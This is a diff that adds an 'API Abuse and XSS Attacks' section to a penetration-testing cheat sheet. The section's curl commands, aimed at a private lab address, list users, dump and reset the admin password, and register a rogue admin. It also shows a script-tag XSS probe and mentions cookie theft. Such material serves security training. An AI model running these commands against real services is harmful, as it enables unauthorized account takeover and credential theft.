@@ -143,9 +143,59 @@ NMAP's NSE scripts can be used for vulnerability scanning. However, caution is a
   ```bash
   sudo nmap -sV -p 443 --script "vuln" 192.168.0.1
   ```
-
-Continue...
   
+## API Abuse and XSS Attacks
+This section focuses on exploiting vulnerabilities in web applications through API abuse and Cross-Site Scripting (XSS) attacks. Understanding these techniques is crucial for identifying and exploiting weaknesses in web applications.
+
+### Retrieving User Lists via API Abuse
+API endpoints can sometimes be exploited to retrieve sensitive information such as user lists:
+```bash
+curl -i http://192.168.0.1:5002/users/v1
+```
+This command fetches a list of users from the API endpoint.
+
+### Dumping Passwords
+To check if passwords can be extracted through API abuse:
+```bash
+curl -i http://192.168.0.1:5002/users/v1/admin/password
+```
+This attempts to dump the password of the admin user.
+
+### Registering a New Admin User
+Sometimes APIs allow creating new admin users, which can be exploited:
+```bash
+curl -d '{"password":"test","username":"test","email":"test@domain.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.0.1:5002/users/v1/register
+```
+This command registers a new admin user with specified credentials.
+
+### Obtaining Authorization Tokens
+After registering, one can log in to retrieve an authorization token:
+```bash
+curl -X 'PUT' 'http://192.168.0.1:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0......FX5ao6ngrY' -d '{"password": "test"}'
+```
+This updates the password and potentially retrieves an authorization token.
+
+### Using Proxy for HTML Response Capture
+Capturing HTML responses can be done using a proxy, helpful in inspecting and modifying requests:
+```bash
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.0.1:5002/users/v1/login --proxy 127.0.0.1:8080
+```
+This sends the request through a proxy for analysis in tools like Burp Suite.
+
+### Basic XSS Attack
+XSS attacks can be performed by injecting script tags in user inputs:
+```bash
+curl -H 'User-Agent: <script>alert(42)</script>' http://target_url
+```
+If the server responds with 200 OK and the alert is executed, it indicates XSS vulnerability.
+
+### Privilege Escalation via XSS
+Privilege escalation can be achieved by stealing cookies via XSS:
+- **Secure Flag**: Only allows transmission of cookies over HTTPS.
+- **HTTPOnly Flag**: Prevents JavaScript from accessing the cookie.
+
+Inspecting cookies in the browser's storage tab can reveal which cookies are session-related and vulnerable to theft.
+
 ## Disclaimer and Legal Notice
 
 ### Ethical Considerations and Legal Compliance
